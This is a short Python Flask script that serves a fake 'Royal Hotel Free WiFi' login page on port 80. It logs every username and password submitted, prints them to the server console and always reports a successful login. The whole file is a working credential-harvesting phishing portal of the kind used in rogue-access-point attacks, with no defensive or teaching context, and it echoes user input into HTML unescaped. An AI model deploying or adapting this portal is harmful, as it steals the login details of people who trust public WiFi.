from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def hello_world():
    content = """
    <h1>ROYAL HOTEL FREE WIFI</h1>
    <form action="/login" method="POST">
        Username: <input type="text" name="username"><br>
        Password: <input type="password" name="password"><br>
        <input type="submit" value="Login">
    </form>
    """
    return content


@app.route("/login", methods=["POST"])
def login():
    user = request.form.get("username")
    password = request.form.get("password")

    print(f"[SERVER] Login attempt -> Username: {user} | Password: {password}")

    return f"<h2>Login Successful</h2><p>Welcome <b>{user}</b></p>"


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)